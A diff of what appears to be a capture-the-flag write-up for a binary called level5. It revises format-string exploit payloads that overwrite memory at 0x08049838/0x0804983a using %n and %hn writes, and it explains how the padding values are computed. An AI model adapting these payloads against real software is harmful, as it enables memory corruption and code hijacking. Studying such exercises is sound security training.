@@ -74,7 +74,8 @@ exploit += "%5$hn"
 ```
 
 ```bash
-(python -c 'print ("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%3$33948x" + "%3$n" + "%3$33624x" + "%4$n")';cat) | ./level5
+(python -c 'print ("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948x" + "%4$n" + "%33632x" + "%5$n")';cat) | ./level5
+
 run < <(python -c 'print ("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%3$33948x" + "%3$n" + "%3$33624x" + "%4$n")';)
 ```
 
@@ -94,6 +95,7 @@ It'ill be 2052 - 33956 = -31904 --> 33632 in uint with overflow
 
 No we can construct the exploit
 It'ill be : \x38\x98\x04\x08\x3a\x98\x04\x08%33948x%4$hn%33632x%5$hn
+
     \x38\x98\x04\x08 or 0x08049838 points to the low order of the target adress
     \x3a\x98\x04\x08 or 0x0804983a points to the high order of the target adress 
     %33948x will write 33948 bytes of padding
@@ -119,7 +121,7 @@ Let's start with the high order bytes :
 It'll be 2052 - 8 = 2044, because we already wrote 8 bytes, the two 4 bytes addresses
 
 Then the low order bytes :
-It'ill be 33956 - 2052 = 31904 --> 33632 in uint with overflow
+It'ill be 33956 - 2052 = 31904
 
 No we can construct the exploit
 It'ill be : \x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn
